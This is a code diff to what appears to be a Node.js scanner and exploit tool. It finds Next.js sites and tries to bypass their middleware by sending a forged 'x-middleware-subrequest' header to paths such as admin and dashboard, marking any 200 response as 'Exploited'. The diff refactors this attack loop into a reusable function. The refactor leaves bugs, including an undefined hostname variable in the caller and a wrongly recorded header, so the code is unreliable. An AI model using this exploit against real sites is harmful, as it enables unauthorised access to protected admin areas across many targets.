@@ -43,7 +43,6 @@ const argv = yargs
   .option('t', {
     alias: 'headless',
     description: 'If the t flag or headless flag is set, it will launch a headless puppeteer.',
-    default: false
   })
   .option('x', {
     alias: 'headers',
@@ -120,9 +119,36 @@ async function checkNextJsVersion(url, browser){
   }
 }
 
+async function attack(ws, headers){
+  let url = ws.split(' ')[0];
+  let hostname = getCompanyName(url);
+  log(`Attacking ${url}`);
+  let wordlist = argv.w ? fs.readFileSync(argv.w, 'utf8').split('\n').map(word => word.trim()).filter(Boolean) : ['admin', 'dashboard']
+  for (let i = 0; i < wordlist.length; i++) {
+    let exploitUrl = url.endsWith('/') ? `${url}${wordlist[i]}` : `${url}/${wordlist[i]}`;
+    try {
+      let response = await fetch(exploitUrl, {
+        'method': 'GET',
+        headers: {
+          'x-middleware-subrequest': headers
+        },
+        redirect: argv.r ? 'follow' : 'manual',
+        keepalive: false
+      });
+      if (response.status == 200){
+        exploitedSites.push(exploitUrl);
+        info[hostname].result = 'Exploited';
+        info[hostname].exploitedUrls.push(exploitUrl)
+        info[hostname].headers = `x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware`
+      }
+    } catch (e) {
+      info[hostname].errors.push({message: e.message, code: e.code, info: `Error attacking`})
+    }
+  }
+}
+
 async function checkWebsites() {
   log('\nStarting security analysis...\n');
-
   const browser = await puppeteer.launch({
     executablePath: argv.c,
     headless: argv.t ? 'new' : false,
@@ -153,53 +179,9 @@ async function checkWebsites() {
 
   if (argv.a) {
     const attacks = vulnerableWebsites.map(async (ws) => {
-      let url = ws.split(' ')[0];
-      let hostname = getCompanyName(url);
-      log(`Attacking ${url}`);
-      let wordlist = argv.w ? fs.readFileSync(argv.w, 'utf8').split('\n').map(word => word.trim()).filter(Boolean) : ['admin', 'dashboard']
-      for (let i = 0; i < wordlist.length; i++) {
-        let exploitUrl = url.endsWith('/') ? `${url}${wordlist[i]}` : `${url}/${wordlist[i]}`;
-        try {
-          let response = await fetch(exploitUrl, {
-            'method': 'GET',
-            headers: {
-              'x-middleware-subrequest': 'middleware:middleware:middleware:middleware:middleware'
-            },
-            redirect: argv.r ? 'follow' : 'manual',
-            keepalive: false
-          });
-          if (response.status == 200){
-            exploitedSites.push(exploitUrl);
-            info[hostname].result = 'Exploited';
-            info[hostname].exploitedUrls.push(exploitUrl)
-            info[hostname].headers = `x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware`
-          }
-        } catch (e) {
-          info[hostname].errors.push({message: e.message, code: e.code, info: `Error attacking`})
-        }
-      }
+      await attack(ws, 'middleware:middleware:middleware:middleware:middleware');
       if (info[hostname].result != 'Exploited' && argv.x) {
-        for (let i = 0; i < wordlist.length; i++) {
-          let exploitUrl = url.endsWith('/') ? `${url}${wordlist[i]}` : `${url}/${wordlist[i]}`;
-          try {
-            let response = await fetch(exploitUrl, {
-              'method': 'GET',
-              headers: {
-                'x-middleware-subrequest': 'src/middleware:src/middleware:src/middleware:src/middleware:src/middleware'
-              },
-              redirect: argv.r ? 'follow' : 'manual',
-              keepalive: false
-            });
-            if (response.status == 200){
-              exploitedSites.push(exploitUrl);
-              info[hostname].result = 'Exploited';
-              info[hostname].exploitedUrls.push(exploitUrl);
-              info[hostname].headers = `x-middleware-subrequest: src/middleware:src/middleware:src/middleware:src/middleware:src/middleware`
-            }
-          } catch (e) {
-            info[hostname].errors.push({message: e.message, code: e.code, info: `Error attacking`})
-          }
-        }
+        await attack(ws, 'src/middleware:src/middleware:src/middleware:src/middleware:src/middleware');
       }
     });
     await Promise.allSettled(attacks);
